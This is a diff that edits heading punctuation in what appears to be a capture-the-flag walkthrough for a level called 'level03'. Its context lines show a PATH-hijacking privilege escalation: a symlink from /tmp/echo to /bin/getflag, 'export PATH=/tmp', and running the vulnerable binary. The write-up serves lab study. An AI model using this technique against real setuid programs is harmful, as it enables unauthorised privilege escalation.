@@ -32,7 +32,7 @@
 
 	This means it uses `/usr/bin/env` to find and execute the first `echo` command in your `$PATH`.
 
-4. **Exploit it by creating a link between files**
+4. **Exploit it by creating a link between files.**
 
 	Create a directory and a fake `echo` that actually runs `getflag`:
 
@@ -40,13 +40,13 @@
 	ln -s /bin/getflag /tmp/echo
 	```
 
-5. **Set your custom `PATH`**
+5. **Set your custom `PATH`:**
 
 	```bash
 	export PATH=/tmp
 	```
 
-6. **Run the vulnerable binary**
+6. **Run the vulnerable binary:**
 
 	```bash
 	./level03
